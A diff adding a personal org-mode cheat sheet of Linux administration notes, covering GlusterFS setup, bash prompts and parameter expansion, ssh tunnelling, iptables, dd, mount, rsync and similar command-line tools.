@@ -1,0 +1,4475 @@
+* MALWARE
+** REMNUX
+*** Networking
+    /etc/network/interfaces
+
+    auto eth0
+    	iface eth0 inet static
+	address 10.0.0.5
+	netmask 255.255.255.0
+	network 10.0.0.0
+	gateway 10.0.0.1
+
+    auto eth0:0
+	iface eth0:0 inet static
+	address 10.0.0.6
+	netmask 255.255.255.0
+	network 10.0.0.0
+	#gateway 10.0.0.1
+
+** Kali
+
+
+* GlusterFS
+** Install
+   # yum install glusterfs-3.3.0-1.el6.x86_64.rpm
+                 glusterfs-fuse-3.3.0-1.el6.x86_64.rpm
+		 glusterfs-geo-replication-3.3.0-1.el6.x86_64.rpm
+		 glusterfs-server-3.3.0-1.el6.x86_64.rpm
+
+   # ./configure --with-config=user
+   # make rpm-utils rpm-dkms
+   # make rpm
+
+** Starting GlusterFS service
+   # /etc/init.d/glusterd start
+   # /etc/init.d/glusterd stop
+
+   CentOS
+   # chkconfig glusterd on
+
+   Debian
+   # update-rc.d glusterd defaults
+
+   # echo "glusterd" >> /etc/rc.local
+
+** Create Trusted Storage Pool
+   # gluster peer probe SERVER
+   # gluster peer status
+
+** Create GlusterFS Volumes
+
+    Distributed - Distributes files throughout the cluster. For more information, see Configuring Distributed Volumes.
+    Distributed Replicated - Replicates data across two or more nodes in the cluster. For more information, see Configuring Distributed Replicated Volumes.
+    Distributed Striped - Stripes files across multiple nodes in the cluster. For more information, see Configuring Distributed Striped Volumes.
+
+    #
+
+
+** Firewall Rules
+
+    24007 – Gluster Daemon
+    24008 – Management
+    24009 and greater (GlusterFS versions less than 3.4) OR
+    49152 (GlusterFS versions 3.4 and later) – Each brick for every volume on your host requires it’s own port. For every new brick, one new port will be used starting at 24009 for GlusterFS versions below 3.4 and 49152 for version 3.4 and above. If you have one volume with two bricks, you will need to open 24009 – 24010 (or 49152 – 49153).
+    38465 – 38467 – this is required if you by the Gluster NFS service.
+
+    The following ports are TCP and UDP:
+
+    111 – portmapper
+
+    # iptables
+    iptables -A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 24007:24017 -j ACCEPT
+    iptables -A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 111 -j ACCEPT
+    iptables -A RH-Firewall-1-INPUT -m state --state NEW -m udp -p udp --dport 111 -j ACCEPT
+    service iptables save
+    service iptables restart
+
+
+** geo-replication
+   # Geo-replication provides a continuous, asynchronous, and incremental replication service from one site to the other
+   # Uses Master-Slave
+
+   Master - A GlusterFS volume
+   Slave - Local directory (ssh://root@remote-host:/path/)
+           A GlusterFS volume (ssh://root@remote-host:gluster://localhost:volname)
+
+   # Create key
+   ssh-keygen -f /var/lib/glusterd/geo-replication/secret.pem
+
+** geo-replication distributed
+
+** replication
+
+** replication distributed
+   # gluster volume create NEW-VOLNAME [replica COUNT] [transport tcp | rdma | tcp,rdma] NEW-BRICK
+
+
+** Wiki
+*** Replica
+    The replica of any volume has nothing to do with nodes, but everything with bricks. We recommend one brick per node, but that's not a hard requirement. So a replica 2 with 6 "bricks" will mean that the bricks will form replica group where each group will have 2 bricks(replica count). Since you have 6 bricks, you will have 3 such groups. So now if you look at that volume its a distribute-replicate volume, where there are 3 distribute sub-volumes, amogst which data will be divided, and each distribute sub-volume is actually a replica group consisiting of 2 bricks, amogst which the data will be replicated.
+
+
+** Errors
+   # gluster peer probe: failed: Probe returned with unknown errno 107
+   In any case, it is a network problem
+
+   # GlusterFS: {path} or a prefix of it is already part of a volume
+   setfattr -x trusted.glusterfs.volume-id $brick_path
+   setfattr -x trusted.gfid $brick_path
+   rm -rf $brick_path/.glusterfs
+
+
+
+* BASH
+** BASH : -x
+   Debug
+
+   set +x
+   set -x
+
+** BASH : .bashrc
+
+   # Setting term for emacs TRAMP
+
+   Make sure The variable tramp-terminal-type is set to "dumb"
+
+   M-x customize-variable RET tramp-terminal-type
+
+   case "$TERM" in
+   "dumb")
+   PS1="> "
+   ;;
+   xterm*|rxvt*|eterm*|screen*)
+   # PS1="my fancy multi-line prompt > "
+   ;;
+   *)
+   PS1="> "
+   ;;
+   esac
+
+** BASH : Colors
+
+
+printf "[ \e[0;32m10.25.53.${i}\e[0m ] "
+start: \e[0;32m		<= color
+end:   \e[0m		<= end
+
+
+\e[1m		# Bold
+\e[2m		# Dim
+\e[4m		# Underlined
+\e[5m		# Blink
+\e[7m		# inverted
+\e[8m		# Hidden
+
+
+\e[39m		# Default
+\e[30m		# Black
+\e[31m		# Red
+\e[32m		# Green
+\e[33m		# Yellow
+\e[34m		# Blue
+\e[35mm		# agenta
+\e[36m		# Cyan
+\e[37m		# Light gray
+\e[90m		# Dark gray
+\e[91m		# Light red
+\e[92m		# Light green
+\e[93m		# Light yellow
+\e[94m		# Light blue
+\e[95m		# Light magenta
+\e[96m		# Light cyan
+\e[97m		# White
+
+
+
+
+# show a bunch of colors in the prompt
+
+T='gYw'   # The test text
+
+echo -e "\n                 40m     41m     42m     43m\
+     44m     45m     46m     47m";
+
+for FGs in '    m' '   1m' '  30m' '1;30m' '  31m' '1;31m' '  32m' \
+           '1;32m' '  33m' '1;33m' '  34m' '1;34m' '  35m' '1;35m' \
+           '  36m' '1;36m' '  37m' '1;37m';
+  do FG=${FGs// /}
+  echo -en " $FGs \033[$FG  $T  "
+  for BG in 40m 41m 42m 43m 44m 45m 46m 47m;
+    do echo -en "$EINS \033[$FG\033[$BG  $T  \033[0m";
+  done
+  echo;
+done
+echo -e "\n                 40m     41m     42m     43m\
+     44m     45m     46m     47m";
+
+
+# some function
+function elite
+{
+
+local GRAY="\[\033[1;30m\]"
+local LIGHT_GRAY="\[\033[0;37m\]"
+local CYAN="\[\033[0;36m\]"
+local LIGHT_CYAN="\[\033[1;36m\]"
+local NO_COLOUR="\[\033[0m\]"
+
+case $TERM in
+    xterm*|rxvt*)
+        local TITLEBAR='\[\033]0;\u@\h:\w\007\]'
+        ;;
+    *)
+        local TITLEBAR=""
+        ;;
+esac
+
+local temp=$(tty)
+local GRAD1=${temp:5}
+PS1="$TITLEBAR\
+$GRAY-$CYAN-$LIGHT_CYAN(\
+$CYAN\u$GRAY@$CYAN\h\
+$LIGHT_CYAN)$CYAN-$LIGHT_CYAN(\
+$CYAN\#$GRAY/$CYAN$GRAD1\
+$LIGHT_CYAN)$CYAN-$LIGHT_CYAN(\
+$CYAN\$(date +%H%M)$GRAY/$CYAN\$(date +%d-%b-%y)\
+$LIGHT_CYAN)$CYAN-$GRAY-\
+$LIGHT_GRAY\n\
+$GRAY-$CYAN-$LIGHT_CYAN(\
+$CYAN\$$GRAY:$CYAN\w\
+$LIGHT_CYAN)$CYAN-$GRAY-$LIGHT_GRAY "
+PS2="$LIGHT_CYAN-$CYAN-$GRAY-$NO_COLOUR "
+}
+
+** BASH : Export PS1,PS2,PS3,PS4,PROMPT_COMMAND
+   http://www.thegeekstuff.com/2008/09/bash-shell-take-control-of-ps1-ps2-ps3-ps4-and-prompt_command/
+
+   export PS1="/u@/h /w> "
+
+
+   \u - Username
+   \h - Hostname
+   \w - Full pathname of current directory. Please note that when you are in the home directory, this will display only ~ as shown above
+   \W - Current directory
+
+
+   The default bash shells PS1-4 and PROMPT_COMMAND
+
+   PS1 - Default interaction prompt
+   PS2 - Continuation interactive prompt
+   PS3 - Prompt used by "select" inside shell script
+   PS4 - Used by "set -x" to prefix tracing output
+   PROMPT_COMMAND - Bash shell executes the content of PROMPT_COMMAND just before displaying the PS1 variable!!!
+       export PROMPT_COMMAND="echo -n [$(date +%k:%m:%S)]"
+       [22:08:51]ramesh@dev-db ~>
+
+** BASH : function
+   main "$@"		# runs main() with all args
+
+** BASH : history reverse search
+   ^R
+
+** BASH : io redirection
+   bad_command >>filename 2>&1
+
+** BASH : Parameter Expansion
+${parameter:-word}
+    If parameter is unset or null, the expansion of word is substituted. Otherwise, the value of parameter is substituted.
+
+${parameter:=word}
+    If parameter is unset or null, the expansion of word is assigned to parameter. The value of parameter is then substituted. Positional parameters and special parameters may not be assigned to in this way.
+
+${parameter:?word}
+    If parameter is null or unset, the expansion of word (or a message to that effect if word is not present) is written to the standard error and the shell, if it is not interactive, exits. Otherwise, the value of parameter is substituted.
+
+${parameter:+word}
+    If parameter is null or unset, nothing is substituted, otherwise the expansion of word is substituted.
+
+${parameter:offset}
+${parameter:offset:length}
+    Expands to up to length characters of parameter starting at the character specified by offset. If length is omitted, expands to the substring of parameter starting at the character specified by offset. length and offset are arithmetic expressions (see section 6.5 Shell Arithmetic). This is referred to as Substring Expansion.
+
+    If offset evaluates to a number less than zero, the value is used as an offset from the end of the value of parameter. If length evaluates to a number less than zero, and parameter is not `@' and not an indexed or associative array, it is interpreted as an offset from the end of the value of parameter rather than a number of characters, and the expansion is the characters between the two offsets. If parameter is `@', the result is length positional parameters beginning at offset. If parameter is an indexed array name subscripted by `@' or `*', the result is the length members of the array beginning with ${parameter[offset]}. A negative offset is taken relative to one greater than the maximum index of the specified array. Substring expansion applied to an associative array produces undefined results.
+
+    Note that a negative offset must be separated from the colon by at least one space to avoid being confused with the `:-' expansion. Substring indexing is zero-based unless the positional parameters are used, in which case the indexing starts at 1 by default. If offset is 0, and the positional parameters are used, $@ is prefixed to the list.
+
+${!prefix*}
+${!prefix@}
+    Expands to the names of variables whose names begin with prefix, separated by the first character of the IFS special variable. When `@' is used and the expansion appears within double quotes, each variable name expands to a separate word.
+
+${!name[@]}
+${!name[*]}
+    If name is an array variable, expands to the list of array indices (keys) assigned in name. If name is not an array, expands to 0 if name is set and null otherwise. When `@' is used and the expansion appears within double quotes, each key expands to a separate word.
+
+${#parameter}
+    The length in characters of the expanded value of parameter is substituted. If parameter is `*' or `@', the value substituted is the number of positional parameters. If parameter is an array name subscripted by `*' or `@', the value substituted is the number of elements in the array.
+
+${parameter#word}
+${parameter##word}
+    The word is expanded to produce a pattern just as in filename expansion (see section 3.5.8 Filename Expansion). If the pattern matches the beginning of the expanded value of parameter, then the result of the expansion is the expanded value of parameter with the shortest matching pattern (the `#' case) or the longest matching pattern (the `##' case) deleted. If parameter is `@' or `*', the pattern removal operation is applied to each positional parameter in turn, and the expansion is the resultant list. If parameter is an array variable subscripted with `@' or `*', the pattern removal operation is applied to each member of the array in turn, and the expansion is the resultant list.
+
+${parameter%word}
+${parameter%%word}
+    The word is expanded to produce a pattern just as in filename expansion. If the pattern matches a trailing portion of the expanded value of parameter, then the result of the expansion is the value of parameter with the shortest matching pattern (the `%' case) or the longest matching pattern (the `%%' case) deleted. If parameter is `@' or `*', the pattern removal operation is applied to each positional parameter in turn, and the expansion is the resultant list. If parameter is an array variable subscripted with `@' or `*', the pattern removal operation is applied to each member of the array in turn, and the expansion is the resultant list.
+
+${parameter/pattern/string}
+
+    The pattern is expanded to produce a pattern just as in filename expansion. Parameter is expanded and the longest match of pattern against its value is replaced with string. If pattern begins with `/', all matches of pattern are replaced with string. Normally only the first match is replaced. If pattern begins with `#', it must match at the beginning of the expanded value of parameter. If pattern begins with `%', it must match at the end of the expanded value of parameter. If string is null, matches of pattern are deleted and the / following pattern may be omitted. If parameter is `@' or `*', the substitution operation is applied to each positional parameter in turn, and the expansion is the resultant list. If parameter is an array variable subscripted with `@' or `*', the substitution operation is applied to each member of the array in turn, and the expansion is the resultant list.
+
+${parameter^pattern}
+${parameter^^pattern}
+${parameter,pattern}
+${parameter,,pattern}
+    This expansion modifies the case of alphabetic characters in parameter. The pattern is expanded to produce a pattern just as in filename expansion. The `^' operator converts lowercase letters matching pattern to uppercase; the `,' operator converts matching uppercase letters to lowercase. The `^^' and `,,' expansions convert each matched character in the expanded value; the `^' and `,' expansions match and convert only the first character in the expanded value. If pattern is omitted, it is treated like a `?', which matches every character. If parameter is `@' or `*', the case modification operation is applied to each positional parameter in turn, and the expansion is the resultant list. If parameter is an array variable subscripted with `@' or `*', the case modification operation is applied to each member of the array in turn, and the expansion is the resultant list.
+
+** BASH : Process Substitution
+Process substitution is supported on systems that support named pipes (FIFOs) or the /dev/fd method of naming open files. It takes the form of
+
+<(list)
+
+or
+
+>(list)
+
+The process list is run with its input or output connected to a FIFO or some file in /dev/fd. The name of this file is passed as an argument to the current command as the result of the expansion. If the >(list) form is used, writing to the file will provide input for list. If the <(list) form is used, the file passed as an argument should be read to obtain the output of list. Note that no space may appear between the < or > and the left parenthesis, otherwise the construct would be interpreted as a redirection.
+
+When available, process substitution is performed simultaneously with parameter and variable expansion, command substitution, and arithmetic expansion.
+
+** BASH : Socket Programming
+
+   Creating Socket
+   exec 3<>/dev/tcp/192.168.1.2/888
+
+   Write to Socket
+   echo -n "Message" >&3
+   printf "Message" >&3
+
+   View Socket
+   cat <&3
+
+   Closing Socket File Handle
+   exec 3>/dev/null
+
+** BASH : String Operations
+   foo=bar
+   a='$foo' # echo $a => $foo
+   a="$foo" # echo $a => bar
+
+
+   Table B-5. String Operations
+
+   | Expression                              | Meaning                                                                                                                            |
+   |-----------------------------------------+------------------------------------------------------------------------------------------------------------------------------------|
+   | ${#string}                              | Length of $string                                                                                                                  |
+   |                                         |                                                                                                                                    |
+   | ${string:position}                      | Extract substring from $string at $position                                                                                        |
+   | ${string:position:length}               | Extract $length characters substring from $string at $position [zero-indexed, first character is at position 0]                    |
+   |                                         |                                                                                                                                    |
+   | ${string#substring}                     | Strip shortest match of $substring from front of $string                                                                           |
+   | ${string##substring}                    | Strip longest match of $substring from front of $string                                                                            |
+   | ${string%substring}                     | Strip shortest match of $substring from back of $string                                                                            |
+   | ${string%%substring}                    | Strip longest match of $substring from back of $string                                                                             |
+   |                                         |                                                                                                                                    |
+   | ${string/substring/replacement}         | Replace first match of $substring with $replacement                                                                                |
+   | ${string//substring/replacement}        | Replace all matches of $substring with $replacement                                                                                |
+   | ${string/#substring/replacement}        | If $substring matches front end of $string, substitute $replacement for $substring                                                 |
+   | ${string/%substring/replacement}        | If $substring matches back end of $string, substitute $replacement for $substring                                                  |
+   |                                         |                                                                                                                                    |
+   | expr match "$string" '$substring'       | Length of matching $substring* at beginning of $string                                                                             |
+   | expr "$string" : '$substring'           | Length of matching $substring* at beginning of $string                                                                             |
+   | expr index "$string" $substring         | Numerical position in $string of first character in $substring* that matches [0 if no match, first character counts as position 1] |
+   | expr substr $string $position $length   | Extract $length characters from $string starting at $position [0 if no match, first character counts as position 1]                |
+   | expr match "$string" '\($substring\)'   | Extract $substring*, searching from beginning of $string                                                                           |
+   | expr "$string" : '\($substring\)'       | Extract $substring* , searching from beginning of $string                                                                          |
+   | expr match "$string" '.*\($substring\)' | Extract $substring*, searching from end of $string                                                                                 |
+   | expr "$string" : '.*\($substring\)'     | Extract $substring*, searching from end of $string                                                                                 |
+
+** BASH : Tilde Expansion
+~
+    The value of $HOME
+~/foo
+    `$HOME/foo'
+
+~fred/foo
+    The subdirectory foo of the home directory of the user fred
+
+~+/foo
+    `$PWD/foo'
+
+~-/foo
+    `${OLDPWD-'~-'}/foo'
+
+~N
+    The string that would be displayed by `dirs +N'
+
+~+N
+    The string that would be displayed by `dirs +N'
+
+~-N
+    The string that would be displayed by `dirs -N'
+
+** BASH : ulimit
+   Provides  control over the resources available to the shell and to processes started by it, on systems that allow such control.  The -H and -S options specify that
+   the hard or soft limit is set for the given resource.  A hard limit cannot be increased by a non-root user once it is set; a soft limit may be increased up to  the
+   value  of  the hard limit.  If neither -H nor -S is specified, both the soft and hard limits are set.  The value of limit can be a number in the unit specified for
+   the resource or one of the special values hard, soft, or unlimited, which stand for the current hard limit, the current soft limit, and no limit, respectively.  If
+   limit  is  omitted,  the  current value of the soft limit of the resource is printed, unless the -H option is given.  When more than one resource is specified, the
+   limit name and unit are printed before the value.  Other options are interpreted as follows:
+   -a     All current limits are reported
+   -b     The maximum socket buffer size
+   -c     The maximum size of core files created
+   -d     The maximum size of a process's data segment
+   -e     The maximum scheduling priority ("nice")
+   -f     The maximum size of files written by the shell and its children
+   -i     The maximum number of pending signals
+   -l     The maximum size that may be locked into memory
+   -m     The maximum resident set size (many systems do not honor this limit)
+   -n     The maximum number of open file descriptors (most systems do not allow this value to be set)
+   -p     The pipe size in 512-byte blocks (this may not be set)
+   -q     The maximum number of bytes in POSIX message queues
+   -r     The maximum real-time scheduling priority
+   -s     The maximum stack size
+   -t     The maximum amount of cpu time in seconds
+   -u     The maximum number of processes available to a single user
+   -v     The maximum amount of virtual memory available to the shell
+   -x     The maximum number of file locks
+   -T     The maximum number of threads
+
+   If limit is given, it is the new value of the specified resource (the -a option is display only).  If no option is given,  then  -f  is  assumed.   Values  are  in
+   1024-byte  increments, except for -t, which is in seconds, -p, which is in units of 512-byte blocks, and -T, -b, -n, and -u, which are unscaled values.  The return
+   status is 0 unless an invalid option or argument is supplied, or an error occurs while setting a new limit.
+
+** BASH : VAR+=('')
+   # Add additional value to variable
+
+* bin
+** ssh
+   You => server => server (Dynamic SOCKS)
+
+   ssh root@${1} -L 8080:localhost:8080 -L 22:localhost:50022 -L5900:localhost:55900 -L 8888:localhost:8888 ${3} "ssh user@${2} -p 50022 -D 8080 -L 50022:${2}:50022 -L 55900:${2}:55900 -L 8888:192.168.1.1:443 -N ${3}"
+
+** blkid
+   # list block uuid
+
+** blkls
+   # Lists contents of deleted (unallocated space) disk blocks.
+   # good for file recovery
+   # copying partitions by offset shown in the partition table
+   http://scx030c064.blogspot.com/2013/02/sleuthkit-file-recovery.html
+
+   blkls imagefile.dd > imagefile.blkls
+
+*** crontab
+
+# Minute   Hour   Day of Month       Month          Day of Week        Command
+# (0-59)  (0-23)     (1-31)    (1-12 or Jan-Dec)  (0-6 or Sun-Sat)
+    0        2          12             *               0,6           /usr/bin/find
+
+Instead of the first five fields, one of eight special strings may appear:
+
+string         meaning
+------         -------
+@reboot        Run once, at startup.
+@yearly        Run once a year, "0 0 1 1 *".
+@annually      (same as @yearly)
+@monthly       Run once a month, "0 0 1 * *".
+@weekly        Run once a week, "0 0 * * 0".
+@daily         Run once a day, "0 0 * * *".
+@midnight      (same as @daily)
+@hourly        Run once an hour, "0 * * * *".
+
+# Example crontab
+
+ SHELL=/bin/bash
+ PATH=/sbin:/bin:/usr/sbin:/usr/bin
+ MAILTO=root
+ HOME=/
+ # run-parts
+ 01 * * * * root run-parts /etc/cron.hourly
+ 02 4 * * * root run-parts /etc/cron.daily
+ 22 4 * * 0 root run-parts /etc/cron.weekly
+ 42 4 1 * * root run-parts /etc/cron.monthly
+
+*** curl
+    -d, --data <data>		# post data
+    --data-ascii, --data-binary, --data-urlencode
+
+    -u, --user <user:password;options>
+
+*** cut
+    netstat -atnlp|grep ssh[^a-z]|awk '{print $7}'|uniq|cut -c 1-4
+
+*** dd
+    dd if=/dev/sdaX of=/path/to/MBR.img bs=512 count=1
+
+    Only 446 bytes of the MBR contain boot code, the next 64 contain the partition table.
+    If you do not want to overwrite your partition table when restoring, it is strongly
+    advised to backup only the MBR boot code.
+
+*** chkconfig
+    The chkconfig utility is a command line tool that allows you to specify in which runlevel to start a selected service
+
+    chkconfig sshd on			# enable a service in runlevels 2, 3, 4, and 5
+    chkconfig sshd on --level 35		# enable a service in runlevels 3 and 5
+    chkconfig abrtd off --level 24	# disable the abrtd in runlevels 2 and 4
+
+*** chmod
+    Setting STICKY bit
+    + On a directory --> Only file owners can delete files put in folder
+      chmod 1777 public (chmod +t public)
+      drwxrwxrwt
+
+    Setting SUID (4), SGID (2)
+
+      chmod 4777 --> set only SUID (user)
+      chmod 2777 --> set only SGID (group)
+
+    + On a directory --> File is instantly set to owner and group of folder
+      chmod 6777 drop_box (chmod u+s,g+s drop_box)
+      drwsrwsrwx   tclark   authors   drop_box
+      all files dropped in here will be owned by user, tclark, and group, authors.
+
+    + On executable files
+      Allow the executable to be run as the file owner (or group) of the executable rather than as the user logged into the system.
+
+*** chroot
+    System devices to mount -o bind: sys,proc,dev,dev/pts
+    for i in /dev /dev/pts /sys /proc; do mount -o bind $i /mnt$i; done
+
+    # un-chrooting
+    sync					# sync first
+    for i in /dev /dev/pts /sys /proc; do mount -o bind $i /mnt$i; done
+
+*** column
+    mount | column -t			# puts everything into a nice table layout
+
+** awk
+   -F\, -F\; -F\|		# Delimiter
+   FS				# Regular expression delimter
+   $NF				# Number of fields in the current record
+
+   Example:
+   $ awk -F ':' '$3>=100 && $NF ~ /\/bin\/sh/' passwd.txt
+   libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+
+   ps -eaf | awk '{ ++cnt } END { print cnt }'	# count number of lines
+
+** du
+   du -d 2 | sort -h	# du with depth of 2; sort human-numerically (K,M,G)
+
+** fc
+   # re-execute commands from history
+   fc [first] [last]
+
+** find
+   find . -mtime -1 -exec ls -la {} \;
+
+	 -mmin n
+	       File's data was last modified n minutes ago.
+
+	 -mtime n
+	       File's  data was last modified n*24 hours ago.  See the comments
+	       for -atime to understand how rounding affects the interpretation
+	       of file modification times.
+
+	 -newer file
+	       File was modified more recently than file.  If file  is  a  sym-
+	       bolic  link and the -H option or the -L option is in effect, the
+	       modification time of the file it points to is always used.
+	 -regex pattern
+
+   # Multiple exec
+   $ find 101 case -iname "*.gz" \( -exec printf "{}\n" \; -exec zcat {} \; \) | grep REST
+   $ find * -type f -exec zgrep -E -i "esper" {} \; -exec printf "FILE {}" \;
+
+   # Using pipe
+   $ find . -type f -name "*gz" -exec sh -c 'file "{}" | grep compressed >/dev/null && echo compressed || echo no' \;
+
+** hdparm
+   hdparm --user-master u --security-unlock p /dev/sdb(c)	# unlock a drive
+  								 # not sure if this works
+
+** id
+   id -u -n	# show just user name
+** ifconfig
+   eth0 NIC IP 192.168.1.5
+   eth0:0 first NIC alias: 192.168.1.6
+
+   ifconfig <interface> dhcp
+   ifconfig <interface>
+
+** inode
+   ls -i
+   stat
+
+   find . -inum [inode-number] -exec rm -i {} \;
+
+** ip
+   ip addr .............show all devices
+   ip addr change dev <dev> <newAddr>
+   ip address add <newAddr> dev <dev> .......Create IP alias
+   ip addr show <dev>
+   ip link set dev <dev> name <newName>
+   ip link set dev <dev> up/down
+
+   ip route list
+   ip route add 0/0 via <gateway> dev <dev>
+   ip route add default via <gateway> dev <dev>
+   ip route show {dev|proto|scope|src}
+
+   Scope........Description
+   global.......valid everywhere
+   site.........valid only within this site (IPv6)
+   link.........valid only on this device
+   host.........valid only inside this hose (machine)
+
+   Proto........Description
+   redirect.....the route was installed to an ICMP redirect
+   kernel.......the route was insatlled by the kernel during autoconfig
+   boot.........the route was installed during the bootup sequence. If a routing daemon starts, it will purge all of them.
+   static.......the route was installed by the administrator to override dynamic routing. Routing daemon will responct them and, probably, even advertise them to its peers.
+   ra...........the route was installed by the Router Discovery protocol.
+
+   Example commands:
+   ip r add 192.168.1.0/24 dev eth0 proto statis scope link src 192.168.1.4 metric 202
+   ip r add 0/0 via 192.168.1.1 dev eth0 metric 202
+
+   OR
+
+   ip r a 192.168.1.0/24 dev eth0
+   ip r a 0/0 via 192.168.1.1
+
+   Example output:
+   default via 192.168.1.1 dev eth0 metric 202
+   192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.4 metric 202
+
+** iptables
+   iptables [-t table] {-A|-D} chain rule-specification
+
+   -n, --numeric
+   -L, --list
+   -S, --list-rules
+   --line-numbers
+
+   -F, --flush CHAIN
+   -Z, --zero CHAIN.........Zero the packet and byte counters in all chains.
+
+   -N, --new-chain CHAIN............Create user-defined chain
+   -X, --delete-chain CHAIN.........Delete user-defined chain
+   -E OLD NEW.......................Rename user-defined chain
+
+   -P, --policy CHAIN TARGET........Set the policy for the chain.
+                      ACCEPT........Let the packet through
+		      DROP..........Drop the packet to the floor
+		      QUEUE.........Pass the packet to userspace
+		      RETURN........Stop traversing this chain and resume at the
+		                    next rule in the previous (calling) chain.
+
+		                    If the end of a built-in chain is reached or a
+				    rule in a built-in chain with target RETURN os
+				    matched, the target specified by the chain policy
+				    determines the fate of the packet.
+
+   -A, --append CHAIN RULE
+   -D, --delete CHAIN RULE
+               	CHAIN RULENUM
+   -I, --insert CHAIN [RULENUM] RULE
+   -R, --replace CHAIN RULENUM RULE
+
+   -p tcp,udp,udplite,icmp,asp,ah,sctp,all
+      --sport, --source-port
+      --dport, --destination-port
+   -s, --source address[/mask]
+   -d, --destination address[/mask]
+
+   -j, --jump TARGET
+              MASQUERADE......nat table only, POSTROUTING chain
+	                      changes the packet source to address of interface it goes out from
+              REDIRECT........nat table only, PREROUTING and OUTPUT chains, aka DNAT
+	                      changes dst IP to 127.0.0.1
+                              -p {tcp|udp} --to-ports
+
+			      Example:
+			      iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 15000
+			      iptables -t nat -A PREROUTING -i eth1 -p tcp --dport 80 -j REDIRECT --to-port 3128
+			         # Configure Squid to know it's a transparent proxy
+
+              SNAT............nat table only, POSTROUTING chain
+	                      changes source address to ipaddr
+			      --to-source ipaddr[-ipaddr][:port[-port]]
+
+			      Example:
+			      Assuming eth1 is internet card, and external IP 123.12.23.43 and internal card is eth0
+			      iptables -t nat -A POSTROUTING -o eth1 -j SNAT --to-source 123.12.23.43
+
+   -i, --in-interface eth0
+   -o, --out-interface eth0
+
+   -m............Match extensions. More things to match to
+                 -m tcp --sport --source-port --dport --destination-port --syn
+	               --tcp-flags examine must-be-set
+		                 SYN,ACK,FIN,RST,URG,PSH,ALL,NONE
+
+   Tables:
+   filter........Default with built in CHAINS
+                 INPUT..........packets destined to local sockets
+		 FORWARD........packets being routed through the box
+		 OUTPUT.........for locally-generated packets
+   nat...........When a packet that creates a new connection is encountered.
+                 PREROUTING.....for altering packets as soon as they come in
+		 OUTPUT.........locally-generated packets before routing
+		 POSTROUTING....as they are about to go out
+   mangle........Used for specialized packet alteration
+                 PREROUTING.....incoming packets before routing
+		 INPUT..........packets coming into the box itself
+		 FORWARD........packets being routed through the box
+		 OUTPUT.........locally-generated packets before routing
+		 POSTROUTING....packets as they are about to go out
+   raw...........Used for configuring exemptions from connection tracking
+                 I don't think I'll need this
+
+   Targets:
+   ACCEPT, DROP, QUEUE, RETURN
+
+   Chains:
+   PREROUTING....Just as the packet comes in; this means anything else on the Linux box
+                 itself (routing, packet filtering) will see the packet going to its
+		 'real' destination. "-i" option can be used.
+   POSTROUTING...Just before it is finally sent out; this is an important detail
+                 since it means anything else on the Linux box itself (routing, packet
+		 filtering) will see the packet unchanged. "-o" option can be used.
+
+   iptables-save > fw.rules
+   iptables-restore < fw.rules
+
+
+   Example -S (--list-rules):
+   -P INPUT DROP
+   -P FORWARD ACCEPT
+   -P OUTPUT ACCEPT
+   -A INPUT -i lo -j ACCEPT
+   -A INPUT -p icmp -m icmp --icmp-type 8 -j ACCEPT
+   -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
+   -A INPUT -p tcp -m tcp --dport 22 -j ACCEPT
+   -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT
+   -A INPUT -s <ip_address>/32 -p tcp -m tcp --dport 443 -j ACCEPT
+   -A INPUT -p tcp -m tcp --dport 443 -j DROP
+   -A INPUT -p tcp -m tcp --dport 12320 -j ACCEPT
+   -A INPUT -p tcp -m tcp --dport 12321 -j ACCEPT
+   -A INPUT -j DROP
+
+   Example hex match:
+     iptables --append INPUT --match string --algo kmp --hex-string '|f4 6d 04 25 b2 02 00 0a|' --jump ACCEPT
+
+   Other Examples:
+     iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+     iptables -A INPUT -p tcp --dport 443 -j ACCEPT
+     iptables -A INPUT -p tcp --dport 9200 -j ACCEPT
+     iptables -A INPUT -p tcp --dport 9300 -j ACCEPT
+
+** less
+   -N, --line-numbers
+
+** lsmod
+   # shows which loadable kernel modules are currently loaded
+   # prints contents of the /proc/modules file
+
+** mount
+  Mounting dd image
+
+# parted image001.dd
+
+Model: Virtio Block Device (virtblk)
+Disk /dev/vda: 25165824000B
+Sector size (logical/physical): 512B/512B
+Partition Table: msdos
+
+Number  Start         End           Size          Type     File system     Flags
+ 2      1048576B      400556031B    399507456B    primary  ext4            boot
+ 3      400556032B    21165506559B  20764950528B  primary  ext4
+ 1      21165506560B  25164775423B  3999268864B   primary  linux-swap(v1)
+
+# mount -o loop,ro,offset=400556032 image001.dd /mnt/rescue
+
+** reset
+   reset terminal when everything looks weird
+
+** route
+   route			# lists routes
+   route add default gw <gateway IP>
+
+** rpm
+   rpm -vh		# print 50 hash marks as file is unpacked
+
+   -i, --install	# install
+   -U, --upgrade	# upgrade
+   -F, --freshen	# freshen
+   -e, --erase		# erase
+   -qa			# query all installed packages
+   -qlp <package>	# list files in package
+
+** rsync
+   -a				# equivalent to -rlptgoD
+   --no-p, --no-perms		# no permissions
+   --chmod=ugo=rwX		# change permissions from the sending side
+  				 # --chmod=Du=rwx,Dg=rx,Do=rx,Fu=rw,Fg=r,Fo=r
+   -e 'ssh'			# specify remote shell to use
+   --delete-excluded		# also delete excluded files from dest dirs
+   --delete-during		# improved deletion mode
+   --delete-delay		# removed after transfer is complete
+   --remove-source-files 	# remove source files
+   --bwlimit=XX			# limit bandwidth in kilobytes
+   --maxsize='100K'		# can use K M G; default K
+   --minsize=XX			# min size
+   --modify-window=N		# Windows FS (N=1 sec)
+   -b --backup-dir=		#
+   --suffix=''			# defaults to ~ without backup-dir
+
+** run-parts
+   run-parts - run scripts or programs in a directory
+
+   run-parts  [--test]  [--verbose] [--report] [--lsbsysinit] [--regex=RE]
+       	[--umask=umask] [--arg=argument] [--exit-on-error] [--help] [--version]
+       	[--list] [--reverse] [--] DIRECTORY
+
+** sed
+
+   p	print the current pattern space
+   h/H	copy/append pattern space to hold space
+   g/G	copy/append hold space to pattern space
+
+   x	exchange the contents of the hold and pattern spaces
+   d	delete pattern space
+
+
+   # REGEX
+   -r, --regexp-extended
+
+   ip address		[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}
